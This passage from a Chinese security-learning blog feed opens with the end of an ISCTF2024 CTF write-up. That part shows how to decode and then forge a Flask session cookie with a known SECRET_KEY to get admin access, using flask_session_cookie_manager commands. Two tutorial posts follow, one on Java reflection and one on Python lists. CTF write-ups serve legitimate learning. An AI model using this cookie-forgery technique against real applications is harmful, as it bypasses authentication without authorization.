class="line">ISCTF&#123;8534881b-b09d-4811-9da2-40695b41c158&#125;</span><br></pre></td></tr></table></figure><h2 id="ISCTF2024【新闻系统】"><a href="#ISCTF2024【新闻系统】" class="headerlink" title="ISCTF2024【新闻系统】"></a>ISCTF2024【新闻系统】</h2><p>给了一个登录界面 尝试 admin  弱口令爆破 没成功</p><p>然后 就看了下cookie 发现有session 那就直接找key</p><p>题目给了一个附件 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.config[&quot;SECRET_KEY&quot;] = &quot;W3l1com_isCTF&quot;</span><br></pre></td></tr></table></figure><p>直接给了</p><p>我们解码看下是个啥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#x27;.eJyrVsrJT8_Mi08tKsovUrIqKSpN1VEqSCwuLs8vSlGyUipJLS4xNDRU0lEqLkksKS0GCpUWpxYB-SAqLzE3FapIqRYA7_MZ7A.Zzr02A.cbGkQjMXcWrkDVwMdM77W1k-KBI&#x27; -s &#x27;W3l1com_isCTF&#x27;       </span><br><span class="line">&#123;&#x27;login_error&#x27;: True, &#x27;password&#x27;: &#x27;test111&#x27;, &#x27;status&#x27;: &#x27;user&#x27;, &#x27;username&#x27;: &#x27;test&#x27;&#125;</span><br></pre></td></tr></table></figure><p>只是个登录报错 还得审计下附件给的源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)   </span><br><span class="line">    title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">    content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    newslist.create_news(title,content)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br></pre></td></tr></table></figure><p>审计代码可以发现我们只要 伪造admin 就会重定向到 &#x2F;admin 这个路由</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;password&#x27;: &#x27;admin222&#x27;, &#x27;status&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot; -s &quot;W3l1com_isCTF&quot;</span><br><span class="line"></span><br><span class="line">.eJyrVipILC4uzy9KUbJSSkzJzcwzMjJS0lEqLkksKS2GiQEFSotTi_ISc1PhQrUAUyMTvw.Zzv_wA.FVJA55ixFNYaH2_r_-uxCrZqN4U</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后访问这个路由&#x2F;admin 发现进入后台 然后还得继续审计代码 后面的内容就是 反序列化的内容 </p><p>放在其他地方讲</p><p>总之session 伪造 首先 看cookie 是不是传入的session 其次 需要 给的密钥 然后 根据需求 需要伪造成什么 应该差不多就是这样了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;flask的session伪造&quot;&gt;&lt;a href=&quot;#flask的session伪造&quot; class=&quot;headerlink&quot; title=&quot;flask的session伪造&quot;&gt;&lt;/a&gt;flask的session伪造&lt;/h2&gt;&lt;h3 id=&quot;1-sessiond作用&quot;</summary>
      
    
    
    
    <category term="session" scheme="https://gu0f3n.github.io/categories/session/"/>
    
    
    <category term="session" scheme="https://gu0f3n.github.io/tags/session/"/>
    
  </entry>
  
  <entry>
    <title>Java反射机制是什么？</title>
    <link href="https://gu0f3n.github.io/2024/10/23/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
    <id>https://gu0f3n.github.io/2024/10/23/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</id>
    <published>2024-10-23T06:45:47.000Z</published>
    <updated>2024-11-22T06:05:44.408Z</updated>
    
    <content type="html"><![CDATA[<p>好久没更新自己的blog 这一个月确实太多事情了 放下了自己ctf的学习进度 话说还是边做笔记变学习有效率</p><h1 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h1><p><strong>反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过 Java 的反射机制，程序员可以更深入地控制程序的运行过程。例如，在程序运行时由用户输入一个类名，然后动态获取该类拥有的构造、属性和方法，甚至调用任意类的任意方法。</span><br></pre></td></tr></table></figure><p>在程序<strong>运行</strong>的时候<strong>动态</strong>创建一个类的实例<br>周用实例的方法和访问它的<strong>属性</strong></p><p>Java代码运行原理：<br>源码<br>编译器(javac)纟编译为字节码.class文件<br>各平台JVM解释器把字节码文件转换成操作系统<br>指令(跨平台)</p><p>了解下什么是反射</p><h2 id="Java反射机制是什么？"><a href="#Java反射机制是什么？" class="headerlink" title="Java反射机制是什么？"></a>Java反射机制是什么？</h2><p><a href="https://c.biancheng.net/java/">Java</a> 反射机制是 Java 语言的一个重要特性。在学习 Java 反射机制前，大家应该先了解两个概念，编译期和运行期。</p><p><strong>编译期</strong>是指把源码交给编译器编译成计算机可以执行的文件的过程。在 Java 中也就是把 Java 代码编成 class 文件的过程。编译期只是做了一些翻译功能，并没有把代码放在内存中运行起来，而只是把代码当成文本进行操作，比如检查错误。</p><p><strong>运行期</strong>是把编译后的文件交给计算机执行，直到程序运行结束。所谓运行期就把在磁盘中的代码放到内存中执行起来。</p><p>Java 反射机制是在运行状态中，<strong><strong>对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；</strong>这种动态获取信息以及动态调用对象方法的功能称为 Java 语言的反射机制**</strong>。简单来说，反射机制指的是程序在运行时能够获取自身的信息。在 Java 中，只要给定类的名字，就可以通过反射机制来获得类的所有信息。</p><p>Java 反射机制在服务器程序和中间件程序中得到了广泛运用。在服务器端，往往需要根据客户的请求，动态调用某一个对象的特定方法。此外，在 ORM 中间件的实现中，运用 Java 反射机制可以读取任意一个 JavaBean 的所有属性，或者给这些属性赋值。</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1729667020117.png" alt="img"></p><p>这里的反射方式</p><ol><li><p><strong>实例化对象</strong>：</p><ul><li>在反射机制中，我们已经有了一个对象（或者不知道对象类型时），它可以是任何类的实例。</li></ul></li><li><p><strong>调用 <code>getClass()</code> 方法</strong>：</p><ul><li>通过调用该对象的 <code>getClass()</code> 方法，我们可以获取该对象的类类型。这种方式不需要在编写代码时提前知道对象的具体类型。</li></ul></li><li><p><strong>得到完整的包类名称</strong>：</p><ul><li><p>使用 <code>getClass()</code> 方法，我们可以获取该对象的完整类名，这包括其所在的包名。这对于动态处理和调试非常有用。</p></li><li><pre><code>- **正常方式**适合静态类型的语言或不需要动态处理的场景，显式类的引入和实例创建。- **反射方式**适合需要动态类处理的场景，可以在运行时根据对象的类型做出不同的处理，提供更大的灵活性。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">     Java 反射机制主要提供了以下功能，这些功能都位于`java.lang.reflect`包。</span><br><span class="line"></span><br><span class="line">     - 在运行时判断任意一个对象所属的类。</span><br><span class="line">     - 在运行时构造任意一个类的对象。</span><br><span class="line">     - 在运行时判断任意一个类所具有的成员变量和方法。</span><br><span class="line">     - 在运行时调用任意一个对象的方法。</span><br><span class="line">     - 生成动态代理。</span><br><span class="line"></span><br><span class="line">众所周知，所有 Java 类均继承了 Object 类，在 Object 类中定义了一个 getClass() 方法，该方法返回同一个类型为 Class 的对象。例如，下面的示例代码：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">Class labelCls = label1.getClass();    // label1为 JLabel 类的对象</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ol><p>利用 Class 类的对象 labelCls 可以访问 labelCls 对象的描述信息、JLabel 类的信息以及基类 Object 的信息。表 1 列出了通过反射可以访问的信息。</p><p>以下是一些 Java 反射的常见用法：</p><ol><li>获取类信息：通过 <code>Class.forName()</code> 方法获取某个类的 <code>Class</code> 对象，然后使用 <code>Class</code> 对象的各种方法获取类的信息，如 <code>getName()</code> 获取类名，<code>getDeclaredMethods()</code> 获取所有方法等。</li><li>创建对象：通过 <code>Class</code> 对象的 <code>getConstructor()</code> 或 <code>getDeclaredConstructor()</code> 方法获取指定构造函数的引用，然后使用 <code>newInstance()</code> 或 <code>newInstance()</code> 方法创建对象。</li><li>访问属性：通过 <code>Class</code> 对象的 <code>getDeclaredField()</code> 方法获取指定属性的引用，然后使用 <code>set()</code> 或 <code>get()</code> 方法设置或获取属性的值。</li><li>调用方法：通过 <code>Class</code> 对象的 <code>getDeclaredMethod()</code> 方法获取指定方法的引用，然后使用 <code>invoke()</code> 方法调用方法并传递参数。</li><li>动态代理：通过 Java 反射实现动态代理，可以在运行时创建一个实现了指定接口的代理类，并实现指定的方法逻辑。</li></ol><p>更多的可以去看<a href="https://y4er.com/posts/java-deserialization-1/">https://y4er.com/posts/java-deserialization-1/</a></p><p>我觉得写的还行的</p><p>什么是反射？反射之中包含了一个「反」字，所以想要解释反射就必须先从「正」开始解释。</p><p>我们先来看一段代码</p><table><thead><tr><th><strong><code>1  </code></strong></th><th><strong><code>fanshe testObj = new fanshe();  </code></strong></th></tr></thead><tbody><tr><td><strong><code>2</code></strong></td><td><strong><code>testObj.setPrice(5);</code></strong></td></tr></tbody></table><p>很简单，就是通过new创建了一个<code>fanshe</code>类的对象<code>testObj</code>，这是[正射]。在这个实例化的过程中，我们需要知道类名，<strong>那么实际开发中如果我们不确定类名的话就没办法<code>new</code>一个实例了，为此java搞了一个反射出来。</strong></p><p>所以反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;好久没更新自己的blog 这一个月确实太多事情了 放下了自己ctf的学习进度 话说还是边做笔记变学习有效率&lt;/p&gt;
&lt;h1 id=&quot;Java反射机制&quot;&gt;&lt;a href=&quot;#Java反射机制&quot; class=&quot;headerlink&quot; title=&quot;Java反射机制&quot;&gt;&lt;/a&gt;J</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>python基础学习</title>
    <link href="https://gu0f3n.github.io/2024/09/11/python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>https://gu0f3n.github.io/2024/09/11/python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-11T07:24:35.000Z</published>
    <updated>2024-11-20T07:41:54.916Z</updated>
    
    <content type="html"><![CDATA[<p>Python是一种跨平台的编程语言，这意味着它可以在Windows，MacOS，Linux等多种平台上运行，甚至已经移植到Java和.NET虚拟机。它是免费和开源的。</p><p>即使当今的大多数Linux和Mac已经预装了Python，但该版本可能已过时。因此，安装最新版本始终是一个好主意。</p><p>说明：作者根据<a href="https://cainiaoplus.com/%E8%BF%9B%E8%A1%8C%E5%AD%A6%E4%B9%A0">https://cainiaoplus.com/进行学习</a></p><p>下面学习过程我直接用linux python 来编写了</p><h2 id="Python-关键字和标识符"><a href="#Python-关键字和标识符" class="headerlink" title="Python 关键字和标识符"></a>Python 关键字和标识符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关键字是Python中的保留字。</span><br><span class="line"></span><br><span class="line">我们不能将关键字用作 [变量名](https://cainiaoplus.com/python/python-variables-datatypes.html)，[函数](https://cainiaoplus.com/python/python-function.html)名或任何其他标识符。它们用于定义Python语言的语法和结构。</span><br><span class="line"></span><br><span class="line">在Python中，关键字区分大小写。</span><br><span class="line"></span><br><span class="line">Python 3.7中有 33 个关键字。该数字在一段时间内可能会略有变化。</span><br><span class="line"></span><br><span class="line">所有关键字必须是小写的，其中 True，False 和 None 除外。下面列出了所有关键字。</span><br></pre></td></tr></table></figure><table><thead><tr><th>False</th><th>await</th><th>else</th><th>import</th><th>pass</th></tr></thead><tbody><tr><td>None</td><td>break</td><td>except</td><td>in</td><td>raise</td></tr><tr><td>True</td><td>class</td><td>finally</td><td>is</td><td>return</td></tr><tr><td>and</td><td>continue</td><td>for</td><td>lambda</td><td>try</td></tr><tr><td>as</td><td>def</td><td>from</td><td>nonlocal</td><td>while</td></tr><tr><td>assert</td><td>del</td><td>global</td><td>not</td><td>with</td></tr><tr><td>async</td><td>elif</td><td>if</td><td>or</td><td>yield</td></tr></tbody></table><h2 id="Python标识符"><a href="#Python标识符" class="headerlink" title="Python标识符"></a>Python标识符</h2><p>标识符是给诸如类，函数，变量等实体的名称。它有助于将一个实体与另一个实体区分开。</p><h3 id="编写标识符的规则"><a href="#编写标识符的规则" class="headerlink" title="编写标识符的规则"></a>编写标识符的规则</h3><ol><li>标识符可以是小写字母<strong>（a 至 z）</strong>或大写字母<strong>（A 至 Z）</strong>或数字<strong>（0 至 9）</strong>或下划线(_)的组合。myClass，var_1，var_name_1, print_this_to_screen 都是有效的。</li><li>标识符不能以数字开头。1variable 是无效的，但 variable1 是有效的。</li><li>关键字不能用作标识符。</li></ol><h3 id="要记住的事情"><a href="#要记住的事情" class="headerlink" title="要记住的事情"></a>要记住的事情</h3><p>Python 是 <strong>区分大小写</strong> 的语言。这意味着 Variable 和 variable 是两个不同的变量。同时，也建议大家，在实际编程中，始终命名有意义的标识符。</p><p>虽然，c &#x3D; 10 也是有效的。但是使用 count &#x3D; 10 看起来会更有意义，并且即使您在经过一段长时间的间隔之后查看代码，也更容易弄清楚它的作用和它所代表的意义。</p><p>可以使用下划线分隔多个单词进行命名，例如：this_is_a_long_variable</p><h3 id="python-语句"><a href="#python-语句" class="headerlink" title="python 语句"></a>python 语句</h3><p>在Python中，语句的结尾用换行符标记。但是我们可以使一条语句扩展到具有多行连续字符（\）的多行。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = 1 + 2 + 3 + \</span><br><span class="line">    4 + 5 + 6 + \</span><br><span class="line">    7 + 8 + 9</span><br></pre></td></tr></table></figure><p>这是显式的行继续。在Python中，在圆括号()，方括号[]和花括号{}中暗含换行符。例如，我们可以将上述多行语句实现为 []和{}也是如此</p><h3 id="Python缩进"><a href="#Python缩进" class="headerlink" title="Python缩进"></a>Python缩进</h3><p>大多数编程语言（例如C，C ++，Java）都使用大括号{}来定义代码块。<strong>而Python使用缩进</strong></p><p>代码块（<a href="https://cainiaoplus.com/python/python-function.html">函数的</a>主体，<a href="https://cainiaoplus.com/python/python-for-loop.html">循环的</a>主体等）以缩进开始，以第一条未缩进的行结束。缩进量取决于您，但是在整个块中缩进量必须保持一致。</p><p>通常，四个空格用于缩进，并且优先于制表符。</p><p>缩进不正确将导致IndentationError。</p><p>直接推进到集合的字面量集</p><h2 id="字面量集"><a href="#字面量集" class="headerlink" title="字面量集"></a>字面量集</h2><p>有四种不同的字面量集合：列表字面量，元组字面量，字典字面量 和 集合字面量。</p><p>eg:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits=[<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span> ,<span class="string">&quot;orange&quot;</span>]<span class="comment">#这是一个列表</span></span><br><span class="line">numbers=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)<span class="comment">#这是一个元组</span></span><br><span class="line">alphabets=&#123;<span class="string">&quot;a:apple&quot;</span>,<span class="string">&quot;b:banana&quot;</span>,<span class="string">&quot;o:orange&quot;</span>&#125;<span class="comment">#这是一个字典</span></span><br><span class="line">vowels=&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;u&#x27;</span>&#125;<span class="comment">#这是一个集合</span></span><br><span class="line"><span class="comment">#这是是一些字面量集</span></span><br><span class="line"><span class="built_in">print</span>(fruits)</span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br><span class="line"><span class="built_in">print</span>(alphabets)</span><br><span class="line"><span class="built_in">print</span>(vowels)</span><br></pre></td></tr></table></figure><h2 id="Python-列表（List）"><a href="#Python-列表（List）" class="headerlink" title="Python 列表（List）"></a>Python 列表（List）</h2><p>在Python编程中，通过将所有项目（元素）放在方括号[]中并用逗号分隔来创建列表。</p><p>它可以具有任意数量的项目，并且它们可以具有不同的类型（整数，浮点数，字符串等）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 空 list</span></span><br><span class="line">my_list = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整数list</span></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 具有混合数据类型的列表</span></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="string">&quot;Hello&quot;</span>, <span class="number">3.4</span>]</span><br></pre></td></tr></table></figure><p>同样，一个列表甚至可以将另一个列表作为项目。这称为嵌套列表。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 嵌套 list</span></span><br><span class="line">my_list = [<span class="string">&quot;mouse&quot;</span>, [<span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>], [<span class="string">&#x27;a&#x27;</span>]]</span><br></pre></td></tr></table></figure><p>访问列表中的元素</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">2</span>])</span><br><span class="line">seconde_list =[<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&quot;Gu0f3n&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(seconde_list[<span class="number">2</span>][<span class="number">4</span>])</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment">#G</span></span><br><span class="line"><span class="comment">#u</span></span><br><span class="line"><span class="comment">#3</span></span><br></pre></td></tr></table></figure><h3 id="如何在Python中切片列表？"><a href="#如何在Python中切片列表？" class="headerlink" title="如何在Python中切片列表？"></a>如何在Python中切片列表？</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list = [<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;z&#x27;</span>]</span><br><span class="line"><span class="comment"># 从第3元素至第5个元素</span></span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">2</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从开始到第4个元素</span></span><br><span class="line"><span class="built_in">print</span>(my_list[:-<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第6个元素至结束</span></span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">5</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 元素开始到结束</span></span><br><span class="line"><span class="built_in">print</span>(my_list[:])</span><br></pre></td></tr></table></figure><p>通过将索引考虑到如下所示的元素之间，切片可以得到最佳的可视化效果。如果我们想要访问一个范围，我们需要两个下标来从列表中分割那部分。(冒号左边闭右边开{  <strong>(]</strong>  }))</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1732016262903.png"></p><h3 id="如何更改或添加元素到列表？"><a href="#如何更改或添加元素到列表？" class="headerlink" title="如何更改或添加元素到列表？"></a>如何更改或添加元素到列表？</h3><p>List是可变的，也就是说，它们的元素可以更改，而不像<a href="https://www.cainiaoplus.com/python/python-string.html">string</a>或<a href="https://www.cainiaoplus.com/python/python-tuple.html">tuple</a>。</p><p>我们可以使用赋值运算符（&#x3D;）更改一个项目或一系列项目。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">my_list[<span class="number">1</span>] =<span class="string">&#x27;o&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line">my_list[<span class="number">2</span>:<span class="number">5</span>]=[<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>]<span class="comment">#改变3到5</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;o&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;]</span></span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;o&#x27;, 6, 6, 6, &#x27;n&#x27;]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以使用append()方法将一个项目添加到列表中，或者使用extend()方法将多个项目添加到列表中。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">my_list.append(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line">my_list.extend([<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;0&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;, 6]</span></span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;0&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;, 6, 6, 6, 6, 6]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此外，我们可以使用insert()方法在需要的位置插入一个项，或者通过将多个项压缩到列表的一个空切片中来插入多个项</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">odd = [<span class="number">1</span>, <span class="number">9</span>]</span><br><span class="line">odd.insert(<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出: [1, 3, 9] </span></span><br><span class="line"><span class="built_in">print</span>(odd)</span><br><span class="line"></span><br><span class="line">odd[<span class="number">2</span>:<span class="number">2</span>] = [<span class="number">5</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出: [1, 3, 5, 7, 9]</span></span><br><span class="line"><span class="built_in">print</span>(odd)</span><br></pre></td></tr></table></figure><h3 id="如何从列表中删除或删除元素？"><a href="#如何从列表中删除或删除元素？" class="headerlink" title="如何从列表中删除或删除元素？"></a>如何从列表中删除或删除元素？</h3><p>我们可以使用关键字del从列表中删除一个或多个项。它甚至可以完全删除列表。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> my_list[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="keyword">del</span> my_list[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="keyword">del</span> my_list</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;]</span></span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;u&#x27;]</span></span><br><span class="line"><span class="comment">#NameError: name &#x27;my_list&#x27; is not defined</span></span><br></pre></td></tr></table></figure><p>我们可以使用remove()方法删除给定项目，也可以使用pop()方法删除给定索引处的项目。</p><p>如果未提供索引，则pop()方法将删除并返回最后一项。这有助于我们将列表实现为堆栈（先进先出数据结构）。</p><p>我们还可以使用该clear()方法清空列表。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">my_list.remove(<span class="string">&#x27;G&#x27;</span>)<span class="comment">#指定将G删除</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="built_in">print</span>(my_list.pop(<span class="number">1</span>))<span class="comment">#将第二位删除并显示出来</span></span><br><span class="line"><span class="built_in">print</span>(my_list)<span class="comment">#打印出来u</span></span><br><span class="line"><span class="built_in">print</span>(my_list.pop())<span class="comment">#没有提供索引，默认最后一位删除并显示</span></span><br><span class="line"><span class="built_in">print</span>(my_list)<span class="comment">#打印出来n</span></span><br><span class="line">my_list.clear()<span class="comment">#清空列表</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#[&#x27;0&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;]</span></span><br><span class="line"><span class="comment">#u</span></span><br><span class="line"><span class="comment">#[&#x27;0&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;]</span></span><br><span class="line"><span class="comment">#n</span></span><br><span class="line"><span class="comment">#[&#x27;0&#x27;, &#x27;f&#x27;, &#x27;3&#x27;]</span></span><br><span class="line"><span class="comment">#[]</span></span><br></pre></td></tr></table></figure><h3 id="Python列表方法"><a href="#Python列表方法" class="headerlink" title="Python列表方法"></a>Python列表方法</h3><p>它们以list.method()方式访问。上面已经使用了某些方法。</p><table><thead><tr><th align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list.html">Python列表方法</a></th></tr></thead><tbody><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-append.html"><strong>append()</strong> -将元素添加到列表的末尾</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-extend.html"><strong>extend()</strong> -将列表的所有元素添加到另一个列表</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-insert.html"><strong>insert()</strong> -在定义的索引处插入一个项目</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-remove.html"><strong>remove()</strong> -从列表中删除一个项目</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-pop.html"><strong>pop()</strong> -删除并返回给定索引处的元素</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-clear.html"><strong>clear()</strong> -从列表中删除所有项目</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-index.html"><strong>index()</strong> -返回第一个匹配项的索引</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-count.html"><strong>count()</strong> -返回作为参数传递的项目数</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-sort.html"><strong>sort()</strong> -以升序对列表中的项目进行排序</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-reverse.html"><strong>reverse()</strong> -反转列表中项目的顺序</a></td></tr><tr><td align="left"><a href="https://www.cainiaoplus.com/python/python-methods-list-copy.html"><strong>copy()</strong> -返回列表的浅表副本</a></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="number">6</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list.index(<span class="string">&#x27;n&#x27;</span>))<span class="comment">#显示索引</span></span><br><span class="line"><span class="built_in">print</span>(my_list.count(<span class="number">6</span>))<span class="comment">#计数</span></span><br><span class="line">second_list =[<span class="number">1</span>,<span class="number">23</span>,<span class="number">3</span>,<span class="number">13</span>,<span class="number">13</span>]</span><br><span class="line">second_list.sort()<span class="comment">#升序排列</span></span><br><span class="line"><span class="built_in">print</span>(second_list)</span><br><span class="line">second_list.reverse()<span 